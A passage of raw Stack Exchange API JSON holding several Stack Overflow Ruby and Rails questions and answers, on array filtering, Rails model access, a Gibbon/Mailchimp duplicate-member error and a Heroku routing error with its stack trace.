1511986700, "post_id": 47559669, "comment_id": 82079899, "body": "I prefer <code>machines.select { |m| [*m[&#39;role&#39;]].include?(&#39;server&#39;) }</code>, because it&#39;s one less step and, imo, reads better. If readers do not understand mudsie&#39;s last sentence, a simple example may help: <code>[*[1,2]] #=&lt; [1,2]; [*&#39;cat&#39;] #=&gt; [&#39;cat&#39;]</code>."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 4, "last_activity_date": 1511981159, "creation_date": 1511981159, "answer_id": 47559669, "question_id": 47558668, "link": "https://stackoverflow.com/questions/47558668/ruby-search-array-of-hashes-and-arrays/47559669#47559669", "title": "Ruby Search Array of Hashes and Arrays", "body": "<p>This is a perfect use-case for <a href=\"http://ruby-doc.org/core/Enumerable.html#method-i-grep\" rel=\"nofollow noreferrer\"><code>Enumerable#grep</code></a>:</p>\n\n<pre><code>machines.reject { |m| [*m['role']].grep('server').empty? }\n</code></pre>\n\n<p>Here a splat is used to produce an array from both <code>Array</code> instance and the <code>String</code> instance.</p>\n"}, {"comments": [{"owner": {"reputation": 6836, "user_id": 458044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c8c35f1a799c3905fc0cab4e030803d?s=128&d=identicon&r=PG", "display_name": "Naren Sisodiya", "link": "https://stackoverflow.com/users/458044/naren-sisodiya"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1511995255, "post_id": 47560803, "comment_id": 82083985, "body": "Array() method tries to create array by calling to_ary, then to_a on its argument."}], "tags": [], "owner": {"reputation": 6836, "user_id": 458044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c8c35f1a799c3905fc0cab4e030803d?s=128&d=identicon&r=PG", "display_name": "Naren Sisodiya", "link": "https://stackoverflow.com/users/458044/naren-sisodiya"}, "is_accepted": false, "score": 2, "last_activity_date": 1511996745, "last_edit_date": 1511996745, "creation_date": 1511985619, "answer_id": 47560803, "question_id": 47558668, "link": "https://stackoverflow.com/questions/47558668/ruby-search-array-of-hashes-and-arrays/47560803#47560803", "title": "Ruby Search Array of Hashes and Arrays", "body": "<p>As per your code the roles can be string or array so safe to check using following</p>\n\n<pre><code>results = machines.select { |machine| Array(machine['role']).include?('server') }\n</code></pre>\n\n<p>Update: using Array, this method tries to create array by calling to_ary, then to_a on its argument. </p>\n"}], "owner": {"reputation": 3522, "user_id": 544864, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2146b632c41a02a62279aed5b4ab57d7?s=128&d=identicon&r=PG", "display_name": "Ken J", "link": "https://stackoverflow.com/users/544864/ken-j"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 460, "favorite_count": 0, "accepted_answer_id": 47559669, "answer_count": 3, "score": 1, "last_activity_date": 1511996745, "creation_date": 1511977350, "question_id": 47558668, "link": "https://stackoverflow.com/questions/47558668/ruby-search-array-of-hashes-and-arrays", "title": "Ruby Search Array of Hashes and Arrays", "body": "<p>I have an array of hashes which also include an array:</p>\n\n<pre><code>machines = [{ 'name' =&gt; 'ldapserver1', 'ip' =&gt; '10.199.0.10',\n         'role' =&gt; ['server', 'initial'] },\n       { 'name' =&gt; 'ldapserver2', 'ip' =&gt; '10.199.0.11',\n         'role' =&gt; ['server', 'secondary'] },\n       { 'name' =&gt; 'ldapclient1', 'ip' =&gt; '10.199.0.12',\n         'role' =&gt; 'client' },\n       { 'name' =&gt; 'ldapclient2', 'ip' =&gt; '10.199.0.13',\n         'role' =&gt; 'client' }]\n</code></pre>\n\n<p>I want to search thru it to get the machine with a matching role. </p>\n\n<p>I can use this to get machines with the client role:</p>\n\n<pre><code>results = @machines.select { |machine| machine['role'] == 'client' }\n\n[{\"name\"=&gt;\"ldapclient1\", \"ip\"=&gt;\"10.199.0.12\", \"role\"=&gt;\"client\"}, {\"name\"=&gt;\"ldapclient2\", \"ip\"=&gt;\"10.199.0.13\", \"role\"=&gt;\"client\"}]\n</code></pre>\n\n<p>But when I try to search the array of roles this breaks:</p>\n\n<pre><code>results = machines.select { |machine| machine['role'] == 'server' }\n\n[]\n</code></pre>\n\n<p>How can I search through the role arrays to find matches for my machines?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 6905065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce83195360b00dc28948be38aae63b82?s=128&d=identicon&r=PG&f=1", "display_name": "Heeb", "link": "https://stackoverflow.com/users/6905065/heeb"}, "edited": false, "score": 0, "creation_date": 1511977812, "post_id": 47558659, "comment_id": 82075262, "body": "well this is just how the group had it set up already and i was just jumping in to help, but what I&#39;m trying to do is have @amount calculate its self every time a tlp is created, because its like a interest payment to from an owned stock. So what I&#39;m trying to do is gain access to &quot;ase&quot; and coin_price"}, {"owner": {"reputation": 21, "user_id": 6905065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce83195360b00dc28948be38aae63b82?s=128&d=identicon&r=PG&f=1", "display_name": "Heeb", "link": "https://stackoverflow.com/users/6905065/heeb"}, "edited": false, "score": 0, "creation_date": 1511977903, "post_id": 47558659, "comment_id": 82075321, "body": "which ase is an Account parameter and coin_price is a RatePlan parameter which RatePlan is another subclass of Account"}, {"owner": {"reputation": 539, "user_id": 9006638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kV5us.jpg?s=128&g=1", "display_name": "Michael Arkhipov", "link": "https://stackoverflow.com/users/9006638/michael-arkhipov"}, "reply_to_user": {"reputation": 21, "user_id": 6905065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce83195360b00dc28948be38aae63b82?s=128&d=identicon&r=PG&f=1", "display_name": "Heeb", "link": "https://stackoverflow.com/users/6905065/heeb"}, "edited": false, "score": 0, "creation_date": 1511992270, "post_id": 47558659, "comment_id": 82082643, "body": "@Heeb in this case this solution is right for you. Moreover, i think you should create a separate class for this logic."}], "tags": [], "owner": {"reputation": 539, "user_id": 9006638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kV5us.jpg?s=128&g=1", "display_name": "Michael Arkhipov", "link": "https://stackoverflow.com/users/9006638/michael-arkhipov"}, "is_accepted": false, "score": 0, "last_activity_date": 1511977324, "creation_date": 1511977324, "answer_id": 47558659, "question_id": 47557933, "link": "https://stackoverflow.com/questions/47557933/access-class-parameters-through-model-class/47558659#47558659", "title": "Access class parameters through model class", "body": "<p>Well, technically, you can using self method.</p>\n\n<p>Model class:</p>\n\n<pre><code>def self.your_method(id)\n  account = Account.find(id)\n  # ...\nend\n</code></pre>\n\n<p>Controller:</p>\n\n<pre><code>Tlp.your_method(account_id)\n</code></pre>\n\n<p>But what exactly do you hope to accomplish by doing this? </p>\n"}], "owner": {"reputation": 21, "user_id": 6905065, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce83195360b00dc28948be38aae63b82?s=128&d=identicon&r=PG&f=1", "display_name": "Heeb", "link": "https://stackoverflow.com/users/6905065/heeb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511977324, "creation_date": 1511974611, "last_edit_date": 1511974716, "question_id": 47557933, "link": "https://stackoverflow.com/questions/47557933/access-class-parameters-through-model-class", "title": "Access class parameters through model class", "body": "<p>What I need is to learn how to access a class' parameter called\n<code>account_id</code> in its model, if possible:</p>\n\n<pre><code>class Employee::TlpsController &lt; ApplicationController\n  ...\n  ...\n  ...\n\n  private\n    def tlp_params\n      params.require(:tlp).permit(:account_id, :amount, :dividend, :allocation)\n    end\n</code></pre>\n\n<p>Here is where I want to be able to access it in the model class:</p>\n\n<pre><code>class Tlp &lt; ApplicationRecord\n  belongs_to :account\n\n  ## need to access account_id from tlp controller, so that i may find the right account\n\n  coin_price = \n  # calculate tlp()  // funciton///\n  def calculate_tlp()\n    @amount = coin_price * ase_count\n  end\nend\n</code></pre>\n\n<p>If you know a better way to access its accounts information, suggestions are kindly welcome.</p>\n"}, {"tags": ["ruby", "cucumber", "bdd"], "comments": [{"owner": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "edited": false, "score": 0, "creation_date": 1511974129, "post_id": 47557637, "comment_id": 82073072, "body": "parameters ? Eg?"}, {"owner": {"reputation": 51, "user_id": 2761483, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/a7d84c013115d42ecd642531871ec54e?s=128&d=identicon&r=PG&f=1", "display_name": "user2761483", "link": "https://stackoverflow.com/users/2761483/user2761483"}, "reply_to_user": {"reputation": 1999, "user_id": 1116381, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/7b470e79f9eb14c32bc0b8f3eb47fbd8?s=128&d=identicon&r=PG", "display_name": "Tachyons", "link": "https://stackoverflow.com/users/1116381/tachyons"}, "edited": false, "score": 0, "creation_date": 1511974526, "post_id": 47557637, "comment_id": 82073341, "body": "For example :   Given x &quot;test&quot; when y &quot;test2&quot; then z &quot;test3&quot;  I would like to remove test1,test2 and test3"}], "owner": {"reputation": 51, "user_id": 2761483, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/a7d84c013115d42ecd642531871ec54e?s=128&d=identicon&r=PG&f=1", "display_name": "user2761483", "link": "https://stackoverflow.com/users/2761483/user2761483"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1511973558, "creation_date": 1511973558, "question_id": 47557637, "link": "https://stackoverflow.com/questions/47557637/ruby-cucumber-remove-all-parameters-from-feature-file", "title": "Ruby-Cucumber remove all parameters from feature file", "body": "<p>I have huge feature file and I would like to remove all the parameter from the feature file. I'm using RubyMine IDE.</p>\n"}, {"tags": ["ruby", "ruby-on-rails-3", "gibbon"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511972757, "post_id": 47557300, "comment_id": 82072225, "body": "How did you delete the member from the list? What was the API response?"}, {"owner": {"reputation": 67, "user_id": 6869105, "user_type": "registered", "profile_image": "https://graph.facebook.com/903801373096867/picture?type=large", "display_name": "Florian Lahitte", "link": "https://stackoverflow.com/users/6869105/florian-lahitte"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511972809, "post_id": 47557300, "comment_id": 82072261, "body": "i delete the member in my application web not in gibbon , i thing it messing something in my method but i&#39;m rookie on rails. this answer i have in my log : XXXX@gmail.com is already a list member. Use PUT to insert or update list members."}, {"owner": {"reputation": 67, "user_id": 6869105, "user_type": "registered", "profile_image": "https://graph.facebook.com/903801373096867/picture?type=large", "display_name": "Florian Lahitte", "link": "https://stackoverflow.com/users/6869105/florian-lahitte"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511973187, "post_id": 47557300, "comment_id": 82072487, "body": "Message: the server responded with status 400 @title=&quot;Member Exists&quot;, @detail=&quot;XXXXXX@hotmail.fr is already a list member. Use PUT to insert or update list members."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511973814, "post_id": 47557300, "comment_id": 82072851, "body": "The error is that the member still exists <b>in gibbon</b>. You&#39;re not deleting the user from the third party, hence the error. You need to send a <code>DELETE</code> API request, as part of the controller action or whatever. See the documentation here: <a href=\"http://developer.mailchimp.com/documentation/mailchimp/reference/lists/members/#delete-delete_lists_list_id_members_subscriber_hash\" rel=\"nofollow noreferrer\">developer.mailchimp.com/documentation/mailchimp/reference/li&zwnj;&#8203;sts/&hellip;</a>"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511973840, "post_id": 47557300, "comment_id": 82072867, "body": "You can see all API calls handled by Gibbon here: <a href=\"http://developer.mailchimp.com/documentation/mailchimp/reference/overview/\" rel=\"nofollow noreferrer\">developer.mailchimp.com/documentation/mailchimp/reference/&hellip;</a>"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511973978, "post_id": 47557300, "comment_id": 82072963, "body": "Also, looking at <a href=\"https://github.com/amro/gibbon\" rel=\"nofollow noreferrer\">the <code>gibbon</code> docs</a>, you could consider using <code>upsert</code> if you don&#39;t want to delete users from mailchimp."}, {"owner": {"reputation": 67, "user_id": 6869105, "user_type": "registered", "profile_image": "https://graph.facebook.com/903801373096867/picture?type=large", "display_name": "Florian Lahitte", "link": "https://stackoverflow.com/users/6869105/florian-lahitte"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511975465, "post_id": 47557300, "comment_id": 82073901, "body": "sorry i&#39;m new and it&#39;s was hard to me to do this method for create user after we sign up but what is upsert how i can put ? in new method or something else ?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511976974, "post_id": 47557300, "comment_id": 82074749, "body": "<code>upsert</code> means &quot;Update or Insert&quot;. In other words, if you try to <code>upsert</code> (as opposed to <code>create</code>) a user <i>who already exists</i>, then it won&#39;t throw an error."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511977022, "post_id": 47557300, "comment_id": 82074774, "body": "The question, really, is: Do you want to delete users from <code>mailchimp</code> if you delete them from your application?? If yes, then implement the <code>delete</code> action. If no, then use <code>upsert</code> instead of <code>create</code>."}, {"owner": {"reputation": 67, "user_id": 6869105, "user_type": "registered", "profile_image": "https://graph.facebook.com/903801373096867/picture?type=large", "display_name": "Florian Lahitte", "link": "https://stackoverflow.com/users/6869105/florian-lahitte"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511977352, "post_id": 47557300, "comment_id": 82074979, "body": "I take the first  choice. so to implement delete action i must to do another method ?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511977713, "post_id": 47557300, "comment_id": 82075189, "body": "Yes. As stated above, you need to trigger a <code>delete</code> request over the API. If you&#39;re still having difficulty, please include any additional information (e.g. errors) in the body of your post, not buried here in the comments, so that others will see it easily."}], "owner": {"reputation": 67, "user_id": 6869105, "user_type": "registered", "profile_image": "https://graph.facebook.com/903801373096867/picture?type=large", "display_name": "Florian Lahitte", "link": "https://stackoverflow.com/users/6869105/florian-lahitte"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 135, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1511972477, "creation_date": 1511972477, "question_id": 47557300, "link": "https://stackoverflow.com/questions/47557300/gibbon-after-member-deleted-i-can-not-add-him-again", "title": "Gibbon After member deleted, I can not add him again", "body": "<p>I don't know if this is gem/api related question or implementation, but after deleting a member from a list, I can't add him again.\nI'm obtaining that</p>\n\n<pre><code>is already a list member. Use PUT to insert or update list members.\n</code></pre>\n\n<p>I am using the following methods to add members from a list:</p>\n\n<pre><code>class SubscribeToNewsletterService\n def initialize(user)\n  @user = user\n  @gibbon = Gibbon::Request.new(api_key: ENV['MAILCHIMP_API_KEY'])\n  @list_id = ENV['MAILCHIMP_LIST_ID']\nend\n\ndef call\n@gibbon.lists(@list_id).members.create(\n  body: {\n    email_address: @user.email,\n    status: \"subscribed\",\n    merge_fields: {\n      FNAME: @user.first_name,\n      LNAME: @user.last_name,\n     }\n   }\n )\n end\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "heroku"], "comments": [{"owner": {"reputation": 155, "user_id": 8733981, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/sSUg7.png?s=128&g=1", "display_name": "rks", "link": "https://stackoverflow.com/users/8733981/rks"}, "edited": false, "score": 2, "creation_date": 1511971585, "post_id": 47557030, "comment_id": 82071433, "body": "Please share the full error stacktrace"}, {"owner": {"reputation": 3015, "user_id": 1518336, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/238d1c14366d5d0dd398b088c99f7b4c?s=128&d=identicon&r=PG", "display_name": "Daniel Westendorf", "link": "https://stackoverflow.com/users/1518336/daniel-westendorf"}, "edited": false, "score": 1, "creation_date": 1511971761, "post_id": 47557030, "comment_id": 82071547, "body": "Add the code for your <code>static_pages_controller</code>."}, {"owner": {"reputation": 938, "user_id": 5718794, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ll2bM.jpg?s=128&g=1", "display_name": "Alex Dovzhanyn", "link": "https://stackoverflow.com/users/5718794/alex-dovzhanyn"}, "edited": false, "score": 0, "creation_date": 1511971870, "post_id": 47557030, "comment_id": 82071628, "body": "And your routes.rb as well"}, {"owner": {"reputation": 13091, "user_id": 385532, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/082cc70175616a7f63b134a741c5d6e3?s=128&d=identicon&r=PG", "display_name": "Matt", "link": "https://stackoverflow.com/users/385532/matt"}, "edited": false, "score": 0, "creation_date": 1511972217, "post_id": 47557030, "comment_id": 82071870, "body": "Where is you <code>StaticPagesController</code> file. Have you rebooted the server after changing routes? For some reason, the server cannot find that controller. What is the filename?"}, {"owner": {"reputation": 938, "user_id": 5718794, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ll2bM.jpg?s=128&g=1", "display_name": "Alex Dovzhanyn", "link": "https://stackoverflow.com/users/5718794/alex-dovzhanyn"}, "edited": false, "score": 0, "creation_date": 1511972238, "post_id": 47557030, "comment_id": 82071878, "body": "Have you set the proper launch command for rails in your <code>Procfile</code> ?"}, {"owner": {"reputation": 352, "user_id": 7648410, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/4Uak9.png?s=128&g=1", "display_name": "uprightbassfan78", "link": "https://stackoverflow.com/users/7648410/uprightbassfan78"}, "edited": false, "score": 0, "creation_date": 1511972595, "post_id": 47557030, "comment_id": 82072110, "body": "It is located in app/controllers/static_pages_controller.rb"}, {"owner": {"reputation": 352, "user_id": 7648410, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/4Uak9.png?s=128&g=1", "display_name": "uprightbassfan78", "link": "https://stackoverflow.com/users/7648410/uprightbassfan78"}, "edited": false, "score": 0, "creation_date": 1511972850, "post_id": 47557030, "comment_id": 82072286, "body": "I didn&#39;t explicitly set any Procfile launch command, do you need to for rails, as I have deployed to Heroku before without doing so."}, {"owner": {"reputation": 938, "user_id": 5718794, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ll2bM.jpg?s=128&g=1", "display_name": "Alex Dovzhanyn", "link": "https://stackoverflow.com/users/5718794/alex-dovzhanyn"}, "edited": false, "score": 1, "creation_date": 1511972938, "post_id": 47557030, "comment_id": 82072343, "body": "I would add one just to be safe. Try adding <code>web: bundle exec rails server -p $PORT</code> to a Procfile located in your project root"}, {"owner": {"reputation": 352, "user_id": 7648410, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/4Uak9.png?s=128&g=1", "display_name": "uprightbassfan78", "link": "https://stackoverflow.com/users/7648410/uprightbassfan78"}, "edited": false, "score": 0, "creation_date": 1511973467, "post_id": 47557030, "comment_id": 82072643, "body": "Afraid i&#39;m stiil getting the same errors as before after having committed the Procfile"}], "owner": {"reputation": 352, "user_id": 7648410, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/4Uak9.png?s=128&g=1", "display_name": "uprightbassfan78", "link": "https://stackoverflow.com/users/7648410/uprightbassfan78"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 277, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1511975146, "creation_date": 1511971509, "last_edit_date": 1511975146, "question_id": 47557030, "link": "https://stackoverflow.com/questions/47557030/actioncontrollerroutingerror-uninitialized-constant", "title": "ActionController::RoutingError uninitialized constant", "body": "<p>My Rails app works fine in development and pushes to Heroku without error, but when I try:</p>\n\n<pre><code>heroku open\n</code></pre>\n\n<p>the heroku log shows the above error. I have checked the case and pluralisation of my controller (called static_pages), so no problem there. I have run </p>\n\n<pre><code>heroku run rake db:migrate\n</code></pre>\n\n<p>My routes.rb file contains </p>\n\n<pre><code>root 'static_pages#home'\n</code></pre>\n\n<p>so the issue can't be that. Anything simple that I may be missing here?</p>\n\n<p>As requested, the full stack trace is:</p>\n\n<blockquote>\n  <p>2017-11-29T15:56:56.587399+00:00 app[web.1]: F,\n  [2017-11-29T15:56:56.587041 #4] FATAL -- :\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]<br>\n  2017-11-29T15:56:56.587686+00:00 app[web.1]: F,\n  [2017-11-29T15:56:56.587397 #4] FATAL -- :\n  [94718486-1b0a-4dea-aeb0-7a26060201d2] ActionController::RoutingError\n  (uninitialized constant StaticPagesController):\n  2017-11-29T15:56:56.561616+00:00 app[web.1]: I,\n  [2017-11-29T15:56:56.561491 #4]  INFO -- :\n  [94718486-1b0a-4dea-aeb0-7a26060201d2] Started GET \"/\" for\n  94.119.64.15 at 2017-11-29 15:56:56 +0000 2017-11-29T15:56:56.587764+00:00 app[web.1]: F,\n  [2017-11-29T15:56:56.587693 #4] FATAL -- :\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]<br>\n  2017-11-29T15:56:56.588311+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/inflector/methods.rb:269:in\n  <code>block in constantize' 2017-11-29T15:56:56.588313+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/inflector/methods.rb:267:in\n  </code>inject' 2017-11-29T15:56:56.588315+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/dependencies.rb:582:in <code>get' 2017-11-29T15:56:56.588312+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/inflector/methods.rb:267:in\n  </code>each' 2017-11-29T15:56:56.588314+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/inflector/methods.rb:267:in\n  <code>constantize' 2017-11-29T15:56:56.588316+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/http/request.rb:85:in\n  </code>controller_class_for' 2017-11-29T15:56:56.588318+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/routing/route_set.rb:43:in\n  <code>controller' 2017-11-29T15:56:56.588319+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/journey/router.rb:50:in\n  </code>block in serve' 2017-11-29T15:56:56.588309+00:00 app[web.1]: F,\n  [2017-11-29T15:56:56.588201 #4] FATAL -- :\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/inflector/methods.rb:269:in\n  <code>const_get' 2017-11-29T15:56:56.588317+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/http/request.rb:78:in\n  </code>controller_class' 2017-11-29T15:56:56.588320+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/journey/router.rb:33:in\n  <code>each' 2017-11-29T15:56:56.588321+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/journey/router.rb:33:in\n  </code>serve' 2017-11-29T15:56:56.588316+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/activesupport-5.1.4/lib/active_support/dependencies.rb:613:in <code>constantize' 2017-11-29T15:56:56.588323+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/etag.rb:25:in</code>call'\n  2017-11-29T15:56:56.588326+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/session/abstract/id.rb:232:in\n  <code>context' 2017-11-29T15:56:56.588325+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/rack-2.0.3/lib/rack/head.rb:12:in</code>call'\n  2017-11-29T15:56:56.588334+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/railties-5.1.4/lib/rails/rack/logger.rb:36:in\n  <code>call_app' 2017-11-29T15:56:56.588332+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/debug_exceptions.rb:59:in\n  </code>call' 2017-11-29T15:56:56.588328+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/middleware/cookies.rb:613:in\n  <code>call' 2017-11-29T15:56:56.588319+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  vendor/bundle/ruby/2.3.0/gems/actionpack-5.1.4/lib/action_dispatch/routing/route_set.rb:29:in\n  </code>serve' 2017-11-29T15:56:56.588324+00:00 app[web.1]:\n  [94718486-1b0a-4dea-aeb0-7a26060201d2]\n  